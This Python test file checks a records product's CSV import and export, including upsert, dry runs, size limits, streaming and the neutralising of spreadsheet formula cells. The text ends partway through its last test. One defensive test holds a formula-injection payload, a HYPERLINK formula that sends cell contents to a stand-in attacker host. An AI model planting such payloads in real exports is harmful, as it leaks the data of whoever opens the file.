"""HTTP-layer acceptance tests for CSV import/export (FR-E1 through FR-E5, FR-U7)."""

from __future__ import annotations

import csv
import io
import math
from typing import Any

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

from glosswork.actor import BOOTSTRAP_PRINCIPAL_ID
from glosswork.errors import ValidationFailedError
from glosswork.fieldtypes import FIELD_TYPES
from glosswork.repositories.models import ObjectType
from glosswork.services import ServiceBundle
from glosswork.services.csv import (
    _FORMULA_TRIGGERS,
    _GUARDED_TYPES,
    _HAS_ESCAPE,
    _NEEDS_ESCAPE,
    CsvService,
)
from glosswork.services.records import MAX_QUERY_LIMIT
from tests.conftest import make_actor, select_options

# Every CSV-representable field type (attachment omitted: CSV refuses an attachment column),
# plus a unique short_text field to exercise upsert-by-unique-field.
_WIDGET_FIELDS = [
    {
        "key": "title",
        "name": "Title",
        "type": "short_text",
        "description": "Short human-readable name for the widget.",
        "required": True,
    },
    {
        "key": "code",
        "name": "Code",
        "type": "short_text",
        "description": "External unique identifier for the widget.",
        "unique": True,
    },
    {
        "key": "notes",
        "name": "Notes",
        "type": "long_text",
        "description": "Free-form narrative about the widget.",
    },
    {
        "key": "points",
        "name": "Points",
        "type": "integer",
        "description": "Effort estimate in points.",
    },
    {
        "key": "score",
        "name": "Score",
        "type": "decimal",
        "description": "Weighted priority score.",
    },
    {
        "key": "active",
        "name": "Active",
        "type": "boolean",
        "description": "Whether the widget is currently active.",
    },
    {
        "key": "due",
        "name": "Due date",
        "type": "date",
        "description": "Date the widget is due.",
    },
    {
        "key": "seen_at",
        "name": "Last seen",
        "type": "datetime",
        "description": "UTC timestamp of the last review of this widget.",
    },
    {
        "key": "status",
        "name": "Status",
        "type": "single_select",
        "description": "Delivery state of the widget.",
        "config": {"options": select_options("todo", "doing", "done")},
    },
    {
        "key": "tags",
        "name": "Tags",
        "type": "multi_select",
        "description": "Free classification labels.",
        "config": {"options": select_options("red", "green", "blue")},
    },
    {
        "key": "owner",
        "name": "Owner",
        "type": "user_ref",
        "description": "Principal accountable for this widget.",
    },
    {
        "key": "related",
        "name": "Related",
        "type": "relation",
        "description": "Other widgets this one relates to; self-referential.",
        "config": {
            "target_type_key": "widget",
            "cardinality": "many",
            "inverse_field_key": "related_by",
        },
    },
    {
        "key": "homepage",
        "name": "Homepage",
        "type": "url",
        "description": "Canonical external link for this widget.",
    },
]


@pytest.fixture
def widget_type(app_services: ServiceBundle) -> ObjectType:
    return app_services.schema.create_object_type(
        make_actor(),
        key="widget",
        name="Widget",
        name_plural="Widgets",
        description="A test object type exercising every CSV-representable field type.",
        key_prefix="WDG",
        fields=_WIDGET_FIELDS,
    )


def _csv_bytes(header: list[str], rows: list[dict[str, str]]) -> bytes:
    buffer = io.StringIO()
    writer = csv.DictWriter(buffer, fieldnames=header)
    writer.writeheader()
    for row in rows:
        writer.writerow(row)
    return buffer.getvalue().encode("utf-8")


def _upload(
    client: TestClient,
    object_type_key: str,
    header: list[str],
    rows: list[dict[str, str]],
    mode: str,
    upsert_key: str | None = None,
    dry_run: bool = False,
    create_missing_options: bool = False,
) -> dict:
    data = {
        "mode": mode,
        "dry_run": "true" if dry_run else "false",
        "create_missing_options": "true" if create_missing_options else "false",
    }
    if upsert_key is not None:
        data["upsert_key"] = upsert_key
    response = client.post(
        f"/api/v1/object-types/{object_type_key}/import",
        files={"file": ("data.csv", _csv_bytes(header, rows), "text/csv")},
        data=data,
    )
    assert response.status_code == 200, response.text
    return response.json()


# --------------------------------------------------------------------- create/upsert


def test_create_mode_creates_new_records(client: TestClient, widget_type: ObjectType) -> None:
    result = _upload(
        client,
        "widget",
        ["title", "points"],
        [{"title": "First", "points": "3"}, {"title": "Second", "points": "5"}],
        mode="create",
    )
    assert result == {"dry_run": False, "created": 2, "updated": 0, "errors": []}


def test_upsert_by_key_updates_existing_and_preserves_omitted_fields(
    client: TestClient, app_services: ServiceBundle, widget_type: ObjectType
) -> None:
    record = app_services.records.create_record(
        make_actor(), "widget", {"title": "Old Title", "status": "todo"}
    )
    result = _upload(
        client,
        "widget",
        ["key", "title"],
        [{"key": record.key, "title": "New Title"}],
        mode="upsert",
        upsert_key="key",
    )
    assert result == {"dry_run": False, "created": 0, "updated": 1, "errors": []}
    updated = app_services.records.get_record(make_actor(), record.key)
    assert updated.data["title"] == "New Title"
    assert updated.data["status"] == "todo"  # omitted column: existing value preserved


def test_upsert_by_unique_field_updates_or_creates(
    client: TestClient, app_services: ServiceBundle, widget_type: ObjectType
) -> None:
    app_services.records.create_record(make_actor(), "widget", {"title": "Existing", "code": "X1"})
    result = _upload(
        client,
        "widget",
        ["title", "code"],
        [
            {"title": "Updated via code", "code": "X1"},  # matches: update
            {"title": "Brand new", "code": "X2"},  # no match: create
        ],
        mode="upsert",
        upsert_key="code",
    )
    assert result == {"dry_run": False, "created": 1, "updated": 1, "errors": []}
    by_code = {
        r["data"]["code"]: r
        for r in app_services.records.query_records(make_actor(), "widget", fields="*").records
    }
    assert by_code["X1"]["data"]["title"] == "Updated via code"
    assert by_code["X2"]["data"]["title"] == "Brand new"


def test_upsert_requires_upsert_key(client: TestClient, widget_type: ObjectType) -> None:
    response = client.post(
        "/api/v1/object-types/widget/import",
        files={"file": ("data.csv", _csv_bytes(["title"], [{"title": "x"}]), "text/csv")},
        data={"mode": "upsert", "dry_run": "false", "create_missing_options": "false"},
    )
    assert response.status_code == 422
    assert response.json()["error"]["code"] == "validation_failed"


# ---------------------------------------------------------------------------- dry-run


def test_dry_run_reports_errors_and_writes_nothing(
    client: TestClient, app_services: ServiceBundle, widget_type: ObjectType
) -> None:
    result = _upload(
        client,
        "widget",
        ["title", "points"],
        [{"title": "", "points": "3"}],  # required field missing
        mode="create",
        dry_run=True,
    )
    assert result["dry_run"] is True
    assert result["created"] == 0
    assert result["updated"] == 0
    assert len(result["errors"]) == 1
    assert result["errors"][0]["row"] == 2
    assert result["errors"][0]["field"] == "title"
    assert "required" in result["errors"][0]["reason"].lower()
    total = app_services.records.query_records(make_actor(), "widget").total_count
    assert total == 0


def test_commit_rolls_back_entire_batch_when_one_row_is_bad(
    client: TestClient, app_services: ServiceBundle, widget_type: ObjectType
) -> None:
    result = _upload(
        client,
        "widget",
        ["title"],
        [{"title": "Good one"}, {"title": ""}, {"title": "Good two"}],
        mode="create",
        dry_run=False,
    )
    assert result["created"] == 0
    assert result["updated"] == 0
    assert len(result["errors"]) == 1
    assert result["errors"][0]["row"] == 3
    total = app_services.records.query_records(make_actor(), "widget").total_count
    assert total == 0


def test_bad_csv_dry_run_reports_one_error_per_offending_row(
    client: TestClient, app_services: ServiceBundle, widget_type: ObjectType
) -> None:
    target = app_services.records.create_record(make_actor(), "widget", {"title": "Target"})
    rows = [
        {"title": "", "status": "todo", "due": "2026-01-01", "related": ""},  # row 2: missing req
        {"title": "Ok", "status": "urgent", "due": "2026-01-01", "related": ""},  # row 3: bad enum
        {"title": "Ok", "status": "todo", "due": "not-a-date", "related": ""},  # row 4: bad date
        {  # row 5: unresolvable relation target
            "title": "Ok",
            "status": "todo",
            "due": "2026-01-01",
            "related": "WDG-999",
        },
    ]
    result = _upload(
        client,
        "widget",
        ["title", "status", "due", "related"],
        rows,
        mode="create",
        dry_run=True,
    )
    assert result["dry_run"] is True
    assert result["created"] == 0
    assert result["updated"] == 0
    assert len(result["errors"]) == 4  # exactly one error per offending row
    rows_with_errors = {e["row"] for e in result["errors"]}
    assert rows_with_errors == {2, 3, 4, 5}
    by_row = {e["row"]: e for e in result["errors"]}
    assert by_row[2]["field"] == "title"
    assert "required" in by_row[2]["reason"].lower()
    assert by_row[3]["field"] == "status"
    assert "urgent" in by_row[3]["reason"]
    assert by_row[4]["field"] == "due"
    assert "not-a-date" in by_row[4]["reason"]
    assert by_row[5]["field"] == "related"
    assert "WDG-999" in by_row[5]["reason"]
    # unchanged: only the fixture record created directly through the service exists
    total = app_services.records.query_records(make_actor(), "widget").total_count
    assert total == 1
    assert app_services.records.get_record(make_actor(), target.key).key == target.key


# ------------------------------------------------------------------- enum options


def test_unknown_option_without_create_missing_options_is_row_error(
    client: TestClient, widget_type: ObjectType
) -> None:
    result = _upload(
        client,
        "widget",
        ["title", "status"],
        [{"title": "x", "status": "urgent"}],
        mode="create",
        dry_run=True,
        create_missing_options=False,
    )
    assert result["created"] == 0
    assert len(result["errors"]) == 1
    error = result["errors"][0]
    assert error["field"] == "status"
    assert "urgent" in error["reason"]


def test_create_missing_options_creates_new_single_and_multi_select_options(
    client: TestClient, app_services: ServiceBundle, widget_type: ObjectType
) -> None:
    result = _upload(
        client,
        "widget",
        ["title", "status", "tags"],
        [{"title": "x", "status": "urgent", "tags": "red|purple"}],
        mode="create",
        dry_run=False,
        create_missing_options=True,
    )
    assert result == {"dry_run": False, "created": 1, "updated": 0, "errors": []}
    _, fields = app_services.schema.get_object_type(make_actor(), "widget")
    fields_by_key = {f.key: f for f in fields}
    status_values = {o["value"] for o in fields_by_key["status"].config["options"]}
    tags_values = {o["value"] for o in fields_by_key["tags"].config["options"]}
    assert "urgent" in status_values
    assert "purple" in tags_values
    created = app_services.records.query_records(make_actor(), "widget", fields="*").records[0]
    assert created["data"]["status"] == "urgent"
    assert created["data"]["tags"] == ["red", "purple"]


# ------------------------------------------------------------------------- relations


def test_relation_column_resolves_by_key_and_links(
    client: TestClient, app_services: ServiceBundle, widget_type: ObjectType
) -> None:
    target = app_services.records.create_record(make_actor(), "widget", {"title": "Target"})
    result = _upload(
        client,
        "widget",
        ["title", "related"],
        [{"title": "Source", "related": target.key}],
        mode="create",
    )
    assert result == {"dry_run": False, "created": 1, "updated": 0, "errors": []}
    source = next(
        r
        for r in app_services.records.query_records(make_actor(), "widget", fields="*").records
        if r["data"]["title"] == "Source"
    )
    linked = app_services.records.list_links(make_actor(), source["key"], "related")
    assert [r.key for r in linked] == [target.key]


# ---------------------------------------------------------------------------- export


def test_export_honors_filter_sort_and_columns(
    client: TestClient, app_services: ServiceBundle, widget_type: ObjectType
) -> None:
    for title, points in [("Low", 1), ("Mid", 5), ("High", 9)]:
        app_services.records.create_record(
            make_actor(), "widget", {"title": title, "points": points}
        )

    response = client.get(
        "/api/v1/object-types/widget/export",
        params={
            "filter": '{"field": "points", "op": "gte", "value": 5}',
            "sort": '[{"field": "points", "dir": "desc"}]',
            "columns": "key,title,points",
        },
    )
    assert response.status_code == 200
    assert response.headers["content-type"].startswith("text/csv")
    assert response.headers["content-disposition"] == 'attachment; filename="widget.csv"'

    rows = list(csv.DictReader(io.StringIO(response.text)))
    assert list(rows[0].keys()) == ["key", "title", "points"]
    assert [r["title"] for r in rows] == ["High", "Mid"]


def test_export_bad_filter_json_is_validation_failed(
    client: TestClient, widget_type: ObjectType
) -> None:
    response = client.get("/api/v1/object-types/widget/export", params={"filter": "{not json"})
    assert response.status_code == 422
    assert response.json()["error"]["code"] == "validation_failed"


# ---------------------------------------------------------------- round-trip losslessness


def test_csv_round_trip_losslessness(
    client: TestClient, app_services: ServiceBundle, widget_type: ObjectType
) -> None:
    actor = make_actor()
    record_a = app_services.records.create_record(
        actor,
        "widget",
        {
            "title": "Alpha",
            "code": "A1",
            "notes": "alpha notes",
            "points": 3,
            "score": 1.5,
            "active": True,
            "due": "2026-01-01",
            "seen_at": "2026-01-01T00:00:00Z",
            "status": "todo",
            "tags": ["red", "green"],
            "owner": BOOTSTRAP_PRINCIPAL_ID,
            "homepage": "https://example.com/alpha",
        },
    )
    record_b = app_services.records.create_record(
        make_actor(),
        "widget",
        {"title": "Beta", "code": "B1", "points": 7, "active": False},
    )
    record_c = app_services.records.create_record(
        make_actor(),
        "widget",
        {"title": "Gamma", "code": "G1", "points": 9, "active": True},
    )
    app_services.records.link_records(make_actor(), record_a.key, "related", [record_b.key])

    export_response = client.get("/api/v1/object-types/widget/export")
    assert export_response.status_code == 200
    reader = csv.DictReader(io.StringIO(export_response.text))
    header = list(reader.fieldnames or [])
    rows_by_key = {row["key"]: row for row in reader}

    # Sanity: the export round-trips the linked pair and every scalar field.
    assert rows_by_key[record_a.key]["related"] == record_b.key
    assert rows_by_key[record_a.key]["tags"] == "red|green"
    assert rows_by_key[record_a.key]["owner"] == BOOTSTRAP_PRINCIPAL_ID

    # Edit a subset of cells:
    # - Alpha: change title, notes, tags, score; clear the (already-satisfied) relation
    #   cell so re-import doesn't try to re-create a link that already exists (CSV
    #   import never unlinks, so an unedited relation cell would hit "already linked"
    #   on a no-op re-import).
    rows_by_key[record_a.key]["title"] = "Alpha Prime"
    rows_by_key[record_a.key]["notes"] = "revised alpha notes"
    rows_by_key[record_a.key]["tags"] = "blue"
    rows_by_key[record_a.key]["score"] = "2.75"
    rows_by_key[record_a.key]["related"] = ""
    # - Beta: flip active, bump points; also clear its auto-created inverse column
    #   ("related_by", holding Alpha from the reciprocal link above) for the same
    #   already-linked reason as Alpha's "related" cell above.
    rows_by_key[record_b.key]["active"] = "true"
    rows_by_key[record_b.key]["points"] = "8"
    rows_by_key[record_b.key]["related_by"] = ""
    # - Gamma: link to Beta for the first time (never linked before: no duplicate-link risk).
    rows_by_key[record_c.key]["related"] = record_b.key

    edited_rows = [rows_by_key[record_a.key], rows_by_key[record_b.key], rows_by_key[record_c.key]]
    response = client.post(
        "/api/v1/object-types/widget/import",
        files={"file": ("data.csv", _csv_bytes(header, edited_rows), "text/csv")},
        data={
            "mode": "upsert",
            "upsert_key": "key",
            "dry_run": "false",
            "create_missing_options": "false",
        },
    )
    assert response.status_code == 200, response.text
    body = response.json()
    assert body == {"dry_run": False, "created": 0, "updated": 3, "errors": []}

    alpha = app_services.records.get_record(actor, record_a.key)
    assert alpha.data["title"] == "Alpha Prime"
    assert alpha.data["notes"] == "revised alpha notes"
    assert alpha.data["tags"] == ["blue"]
    assert alpha.data["score"] == 2.75
    # Untouched fields survive the partial update unchanged.
    assert alpha.data["code"] == "A1"
    assert alpha.data["status"] == "todo"
    assert alpha.data["owner"] == BOOTSTRAP_PRINCIPAL_ID
    # The pre-existing link is untouched by the empty relation cell.
    assert [r.key for r in app_services.records.list_links(actor, record_a.key, "related")] == [
        record_b.key
    ]

    beta = app_services.records.get_record(actor, record_b.key)
    assert beta.data["active"] is True
    assert beta.data["points"] == 8

    gamma_links = app_services.records.list_links(actor, record_c.key, "related")
    assert [r.key for r in gamma_links] == [record_b.key]


# --------------------------------------------------------- bounded, and streamed
#
# Watched to fail against a tree without these bounds: a 20,000-row import and a 2 MB
# cell were both accepted with no ceiling anywhere, a Latin-1 file was a 500, and
# `services/csv.py` carried a literal `limit=100_000` that truncated silently.


def _rows(n: int) -> list[dict[str, str]]:
    return [{"title": f"Row {i}"} for i in range(n)]


class TestImportBounds:
    def test_a_file_at_the_row_ceiling_is_accepted(
        self, client: TestClient, app: FastAPI, widget_type: ObjectType
    ) -> None:
        cap = app.state.settings.max_csv_import_rows
        result = _upload(client, "widget", ["title"], _rows(cap), mode="create")
        assert result["created"] == cap

    def test_one_row_past_the_ceiling_is_refused_before_anything_is_written(
        self,
        client: TestClient,
        app: FastAPI,
        app_services: ServiceBundle,
        widget_type: ObjectType,
    ) -> None:
        cap = app.state.settings.max_csv_import_rows
        response = client.post(
            "/api/v1/object-types/widget/import",
            files={"file": ("data.csv", _csv_bytes(["title"], _rows(cap + 1)), "text/csv")},
            data={"mode": "create", "dry_run": "false", "create_missing_options": "false"},
        )
        assert response.status_code == 422
        error = response.json()["error"]
        assert error["code"] == "validation_failed"
        assert "GW_MAX_CSV_IMPORT_ROWS" in error["message"]
        assert app_services.records.query_records(make_actor(), "widget").total_count == 0

    def test_a_file_past_the_byte_ceiling_is_refused_before_anything_is_written(
        self, client: TestClient, app_services: ServiceBundle, widget_type: ObjectType
    ) -> None:
        """A small ceiling on a purpose-built service, so the test does not have to send
        25 MiB to prove the rule; the route's own bounded read is proven separately by
        the row test above going through the real settings."""
        service = CsvService(
            app_services.records, app_services.schema, max_import_bytes=64, max_import_rows=10
        )
        with pytest.raises(ValidationFailedError) as exc:
            service.import_csv(
                make_actor(), "widget", _csv_bytes(["title"], _rows(20)), mode="create"
            )
        # ``validation_failed``, not ``payload_too_large``: both CSV ceilings are
        # properties of the file the caller chose and share one remedy.
        assert exc.value.details["setting"] == "GW_MAX_CSV_IMPORT_BYTES"
        assert app_services.records.query_records(make_actor(), "widget").total_count == 0

    def test_a_latin_1_file_is_a_validation_error_naming_the_byte_offset(
        self, client: TestClient, widget_type: ObjectType
    ) -> None:
        body = "title\ncafé\n".encode("latin-1")
        response = client.post(
            "/api/v1/object-types/widget/import",
            files={"file": ("data.csv", body, "text/csv")},
            data={"mode": "create", "dry_run": "false", "create_missing_options": "false"},
        )
        assert response.status_code == 422
        error = response.json()["error"]
        assert error["code"] == "validation_failed"
        assert error["details"]["byte_offset"] == body.index(b"\xe9")
        assert "UTF-8" in error["message"]


class CountingRecordRepository:
    """Wraps the record **repository** and counts the two reads export used to make per
    record, the way ``tests/test_principal_sidecar.py`` counts ``principals_by_ids``.

    Counted at the repository rather than at the service on purpose: "one read per
    (page, field)" is a claim about queries issued, and a service method that batched
    its outer call while still fanning out inside would satisfy a service-level count
    and change nothing.
    """

    def __init__(self, inner: Any) -> None:
        self._inner = inner
        self.link_reads = 0
        self.get_record_calls = 0

    def __getattr__(self, name: str) -> Any:
        return getattr(self._inner, name)

    def linked_keys_for_records(self, *args: Any, **kwargs: Any) -> Any:
        self.link_reads += 1
        return self._inner.linked_keys_for_records(*args, **kwargs)

    def links_from(self, *args: Any, **kwargs: Any) -> Any:
        self.link_reads += 1
        return self._inner.links_from(*args, **kwargs)

    def get_record(self, *args: Any, **kwargs: Any) -> Any:
        self.get_record_calls += 1
        return self._inner.get_record(*args, **kwargs)


class TestExportStreaming:
    @pytest.fixture
    def linked_widgets(self, app_services: ServiceBundle, widget_type: ObjectType) -> int:
        """More rows than one query page, each linked to two others through the one
        self-referential relation field the widget fixture already has."""
        count = MAX_QUERY_LIMIT + 5
        records = [
            app_services.records.create_record(make_actor(), "widget", {"title": f"W{i}"})
            for i in range(count)
        ]
        for record in records[:10]:
            app_services.records.link_records(
                make_actor(), record.key, "related", [records[0].key, records[1].key]
            )
        return count

    def test_it_yields_the_header_before_the_rows_are_built(
        self, app_services: ServiceBundle, linked_widgets: int
    ) -> None:
        """The streaming property itself, asserted as ``tests/test_export.py`` asserts
        ``ExportService.stream``'s: the first chunk arrives without the whole file."""
        stream = app_services.csv.export_csv_stream(make_actor(), "widget")
        first = next(stream)
        assert first.startswith("key,title,")
        assert first.endswith("\r\n")
        assert len(list(stream)) == linked_widgets

    def test_the_bytes_are_identical_to_the_buffered_answer(
        self, app_services: ServiceBundle, linked_widgets: int
    ) -> None:
        """Over a fixture with a relation field and more rows than one page. ``export_csv``
        is a thin caller of the generator, so this pins that the streamed concatenation is
        what a single-string caller still gets."""
        streamed = "".join(app_services.csv.export_csv_stream(make_actor(), "widget"))
        assert app_services.csv.export_csv(make_actor(), "widget") == streamed
        parsed = list(csv.DictReader(io.StringIO(streamed)))
        assert len(parsed) == linked_widgets
        # By key, not by position: the default query order is not creation order.
        by_key = {row["key"]: row for row in parsed}
        assert by_key["WDG-001"]["related"] == "WDG-001|WDG-002"

    def test_link_reads_are_one_per_page_per_relation_field_and_the_fan_out_is_gone(
        self, app_services: ServiceBundle, linked_widgets: int
    ) -> None:
        """``ceil(N / MAX_QUERY_LIMIT) * F`` link reads, and **no** per-target
        ``get_record``. Counting only the outer call would have looked right while the
        inner fan-out survived."""
        records = app_services.records
        counting = CountingRecordRepository(records._records)  # noqa: SLF001
        records._records = counting  # noqa: SLF001

        list(app_services.csv.export_csv_stream(make_actor(), "widget"))

        pages = math.ceil(linked_widgets / MAX_QUERY_LIMIT)
        # Counted off the real schema, not off ``_WIDGET_FIELDS``: ``related`` is
        # self-referential, so the schema engine materializes its inverse ``related_by``
        # as a second relation field and the export has two columns to resolve.
        _, fields = app_services.schema.get_object_type(make_actor(), "widget")
        relation_fields = len([f for f in fields if f.type == "relation"])
        assert relation_fields == 2
        assert counting.link_reads == pages * relation_fields
        assert counting.get_record_calls == 0

    def test_an_export_over_the_row_ceiling_is_refused_rather_than_truncated(
        self, app_services: ServiceBundle, widget_type: ObjectType
    ) -> None:
        """A refusal, not a truncation: code that returned the first 100,000 rows with
        nothing saying so is what this guards against."""
        for i in range(3):
            app_services.records.create_record(make_actor(), "widget", {"title": f"W{i}"})
        service = CsvService(app_services.records, app_services.schema, max_export_rows=2)
        with pytest.raises(ValidationFailedError) as exc:
            list(service.export_csv_stream(make_actor(), "widget"))
        assert "GW_MAX_CSV_EXPORT_ROWS" in exc.value.message
        assert exc.value.details["total_count"] == 3

    def test_an_export_at_the_row_ceiling_still_succeeds(
        self, app_services: ServiceBundle, widget_type: ObjectType
    ) -> None:
        for i in range(2):
            app_services.records.create_record(make_actor(), "widget", {"title": f"W{i}"})
        service = CsvService(app_services.records, app_services.schema, max_export_rows=2)
        assert len(list(service.export_csv_stream(make_actor(), "widget"))) == 3  # header + 2


# ------------------------------------------------- DD-20: inert CSV cells


class TestFormulaNeutralization:
    """A CSV cell is content, never a program (DD-20).

    `_render_cell` fed `str(value)` straight into `csv.writer`, so a text value
    beginning with `=`, `+`, `-`, `@`, tab or carriage return executed when the export
    was opened in Excel, Sheets or LibreOffice. The route serves `text/csv` with
    `Content-Disposition: attachment`, so the file lands on the analyst's disk: any
    writer on a type plants it, whoever exports the type is the victim.
    """

    HYPERLINK = '=HYPERLINK("http://evil.example/?"&A1,"Click me")'

    def _export_rows(self, client: TestClient) -> list[dict[str, str]]:
        response = client.get("/api/v1/object-types/widget/export")
        assert response.status_code == 200
        return list(csv.DictReader(io.StringIO(response.text)))

    def test_the_reviews_payload_exports_with_a_leading_apostrophe(
        self, client: TestClient, app_services: ServiceBundle, widget_type: ObjectType
    ) -> None:
        """A security review's probe, which an unguarded export writes out verbatim."""
        app_services.records.create_record(make_actor(), "widget", {"title": self.HYPERLINK})
        assert self._export_rows(client)[0]["title"] == "'" + self.HYPERLINK

    def test_the_patterns_match_exactly_the_named_trigger_set(self) -> None:
        """The two patterns are written literally so they read as patterns; this is what
        pins them to `_FORMULA_TRIGGERS` in both directions, so a trigger added to the
        constant and not to the patterns fails here rather than shipping."""
        assert _FORMULA_TRIGGERS == "=+-@\t\r"
        for trigger in _FORMULA_TRIGGERS:
            assert _NEEDS_ESCAPE.match(trigger)
            assert _HAS_ESCAPE.match("'" + trigger)
            assert not _HAS_ESCAPE.match(trigger)
        for benign in "abzAZ09 \"#$%^&*()_.,;:/\\|<>?!~`'":
            assert not _NEEDS_ESCAPE.match(benign), benign

    def test_the_guarded_type_set_is_four_names_that_exist(self) -> None:
        """The guard reads the field type, never sniffs the value's Python type, and the
        set is checked against `FIELD_TYPES` by name, so a name that is not a field type
        this product has (`email`, say) cannot slip into it."""
        assert _GUARDED_TYPES == {"short_text", "long_text", "single_select", "multi_select"}
        assert _GUARDED_TYPES <= FIELD_TYPES

    def test_a_negative_decimal_is_untouched(
        self, client: TestClient, app_services: ServiceBundle, widget_type: ObjectType
    ) -> None:
        """`integer` and `decimal` are excluded because `-5` is a number: prefixing it
        would break the numeric round trip, and neither can begin with `=`, `+`, `@`,
        tab or return in any case."""
        app_services.records.create_record(
            make_actor(), "widget", {"title": "Negative", "points": -5, "score": -2.5}
        )
        row = self._export_rows(client)[0]
        assert row["points"] == "-5"
        assert row["score"] == "-2.5"

    def test_a_url_and_a_user_ref_cell_are_unchanged(
        self, client: TestClient, app_services: ServiceBundle, widget_type: ObjectType
    ) -> None:
        """Fences, not members. `_URL_PATTERN` enforces `^https?://[^\\s]+$` at both
        sites that admit a `url` value, and a `user_ref` in `records.data` is a bare
        principal id, so neither can begin with a trigger and neither is guarded."""
        app_services.records.create_record(
            make_actor(),
            "widget",
            {
                "title": "Fenced",
                "homepage": "https://example.com/x",
                "owner": BOOTSTRAP_PRINCIPAL_ID,
            },
        )
        row = self._export_rows(client)[0]
        assert row["homepage"] == "https://example.com/x"
        assert row["owner"] == BOOTSTRAP_PRINCIPAL_ID

    def test_the_key_column_and_relation_cells_are_unchanged(
        self, client: TestClient, app_services: ServiceBundle, widget_type: ObjectType
    ) -> None:
        """Neither reaches `_render_cell` at all: `_export_row` emits `record["key"]`
        and the `|`-joined relation targets directly, and both are record keys matching
        `^[A-Z][A-Z0-9]{1,9}-\\d+$`."""
        target = app_services.records.create_record(make_actor(), "widget", {"title": "Target"})
        source = app_services.records.create_record(make_actor(), "widget", {"title": "Source"})
        app_services.records.link_records(make_actor(), source.key, "related", [target.key])
        by_key = {r["key"]: r for r in self._export_rows(client)}
        assert by_key[source.key]["key"] == source.key
        assert by_key[source.key]["related"] == target.key

    def test_a_long_text_beginning_with_a_tab_is_guarded(
        self, client: TestClient, app_services: ServiceBundle, widget_type: ObjectType
    ) -> None:
        app_services.records.create_record(
            make_actor(), "widget", {"title": "Tabbed", "notes": "\tleading tab"}
        )
        assert self._export_rows(client)[0]["notes"] == "'\tleading tab"

    def test_a_markdown_bullet_exports_with_an_apostrophe_as_an_accepted_cost(
        self, client: TestClient, app_services: ServiceBundle, widget_type: ObjectType
    ) -> None:
        """Stated rather than discovered. A `long_text` beginning `- item` is an
        ordinary markdown bullet list, and it exports with a leading apostrophe. The
        round trip stays exact; the file just reads oddly. Dropping `-` from the trigger
        set would reopen the injection it closes, so the apostrophe stays."""
        app_services.records.create_record(
            make_actor(), "widget", {"title": "Bulleted", "notes": "- first\n- second"}
        )
        assert self._export_rows(client)[0]["notes"] == "'- first\n- second"

    @pytest.mark.parametrize("create_missing_options", [False, True])
    def test_a_single_select_option_starting_with_plus_round_trips(
        self,
        client: TestClient,
        app_services: ServiceBundle,
        widget_type: ObjectType,
        create_missing_options: bool,
    ) -> None:
        """Guarded once on export, stripped once on import, and matched against the
        option set either way. With `create_missing_options` on, the strip is what stops
        an option literally named `'+urgent` being created (the single-select form of
        the per-member problem below)."""
        app_services.schema.add_field(
            make_actor(),
            "widget",
            {
                "key": "priority",
                "name": "Priority",
                "type": "single_select",
                "description": "Priority band, whose option values begin with a sign.",
                "config": {"options": select_options("+urgent", "normal")},
            },
        )
        app_services.records.create_record(
            make_actor(), "widget", {"title": "Signed", "priority": "+urgent"}
        )
        exported = self._export_rows(client)[0]
        assert exported["priority"] == "'+urgent"

        result = _upload(
            client,
            "widget",
            ["key", "priority"],
            [{"key": exported["key"], "priority": exported["priority"]}],
            mode="upsert",
            upsert_key="key",
            create_missing_options=create_missing_options,
        )
        assert result["errors"] == []
        record = app_services.records.get_record(make_actor(), exported["key"])
        assert record.data["priority"] == "+urgent"
        _, fields = app_services.schema.get_object_type(make_actor(), "widget")
        priority = {f.key: f for f in fields}["priority"]
        assert {o["value"] for o in priority.config["options"]} == {"+urgent", "normal"}

    def test_a_multi_select_cell_is_guarded_once_on_the_cell_not_per_member(
        self, client: TestClient, app_services: ServiceBundle, widget_type: ObjectType
    ) -> None:
        """A spreadsheet evaluates a cell
        that *starts* with a trigger, so member two of `a|=b` is already inert. Guarding
        per member would produce `a|'=b`, which `_resolve_multi_select` splits and
        matches against the option set -- a miss that is a `RowError` with
        `create_missing_options` off and, with it on, silently creates an option
        literally named `'=b`.
        """
        app_services.schema.add_field(
            make_actor(),
            "widget",
            {
                "key": "marks",
                "name": "Marks",
                "type": "multi_select",
                "description": "Labels whose values begin with a sign.",
                "config": {"options": select_options("=first", "=second", "plain")},
            },
        )
        app_services.records.create_record(
            make_actor(), "widget", {"title": "Marked", "marks": ["=first", "=second", "plain"]}
        )
        exported = self._export_rows(client)[0]
        # One apostrophe, at the front of the cell. The interior members keep theirs.
        assert exported["marks"] == "'=first|=second|plain"
        assert exported["marks"].count("'") == 1

        result = _upload(
            client,
            "widget",
            ["key", "marks"],
            [{"key": exported["key"], "marks": exported["marks"]}],
            mode="upsert",
            upsert_key="key",
            create_missing_options=True,
        )
        assert result["errors"] == []
        record = app_services.records.get_record(make_actor(), exported["key"])
        assert record.data["marks"] == ["=first", "=second", "plain"]
        _, fields = app_services.schema.get_object_type(make_actor(), "widget")
        marks = {f.key: f for f in fields}["marks"]
        # No option named after the escape was invented.
        assert {o["value"] for o in marks.config["options"]} == {"=first", "=second", "plain"}


class TestTheEscapeIsInjective:
    """The escape is injective, asserted by a property-style loop over apostrophe runs
    rather than by named cases.

    The escape was **not** injective as first written. Prefixing only on a bare trigger
    loses a stored leading apostrophe on the way back: `=foo` and `'=foo` would both
    export as `'=foo` and import as `=foo`, collapsing two distinct stored values into
    one -- in the exact case the original premise cited as proof it worked. Counting the
    run is the correction, and this loop is what would have caught it.
    """

    RUNS = range(5)  # n = 0..4 apostrophes

    def _values(self, triggers: str) -> list[str]:
        return ["'" * n + trigger + "val" for n in self.RUNS for trigger in triggers]

    def _export_by_key(self, client: TestClient) -> dict[str, dict[str, str]]:
        response = client.get("/api/v1/object-types/widget/export")
        assert response.status_code == 200
        return {row["key"]: row for row in csv.DictReader(io.StringIO(response.text))}

    def test_short_text_and_long_text_over_all_six_triggers(
        self, client: TestClient, app_services: ServiceBundle, widget_type: ObjectType
    ) -> None:
        """Both are in `_AS_IS_TYPES` and reach `validate_value` with the cell
        unstripped, so all six triggers -- the four printable ones, tab and carriage
        return -- round-trip exactly."""
        values = self._values(_FORMULA_TRIGGERS)
        keys = {
            app_services.records.create_record(
                make_actor(), "widget", {"title": value, "notes": value}
            ).key: value
            for value in values
        }

        rows = self._export_by_key(client)
        exported: list[str] = []
        for key, value in keys.items():
            assert rows[key]["title"] == "'" + value, value
            assert rows[key]["notes"] == "'" + value, value
            exported.append(rows[key]["title"])
        # Injective: distinct stored values never share an exported cell.
        assert len(set(exported)) == len(values)

        result = _upload(
            client,
            "widget",
            ["key", "title", "notes"],
